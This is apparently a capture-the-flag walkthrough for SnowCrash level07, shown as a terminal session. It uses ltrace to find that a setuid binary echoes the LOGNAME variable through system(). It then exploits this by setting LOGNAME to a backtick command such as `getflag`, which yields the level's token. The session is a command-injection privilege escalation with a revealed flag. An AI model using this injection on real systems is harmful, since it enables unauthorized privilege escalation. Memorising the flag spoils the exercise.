Level07 instructions

```
level07@SnowCrash:~$ ll
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 ./
d--x--x--x 1 root    users    340 Aug 30  2015 ../
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout*
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07*
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile*
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7b4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                                 = 2007
geteuid()                                                                                 = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                       = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                       = 0
getenv("LOGNAME")                                                                         = "level07"
asprintf(0xbffff704, 0x8048688, 0xbfffff3c, 0xb7e5ee55, 0xb7fed280)                       = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                    = 0
+++ exited (status 0) +++
level07@SnowCrash:~$ echo $LOGNAME
level07
level07@SnowCrash:~$ export LOGNAME="\`whoami\`"
level07@SnowCrash:~$ echo $LOGNAME
`whoami`
level07@SnowCrash:~$ ./level07
flag07
level07@SnowCrash:~$ export LOGNAME="\`getflag\`"
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
level07@SnowCrash:~$
level07@SnowCrash:~$ su level08
Password:
level08@SnowCrash:~$
```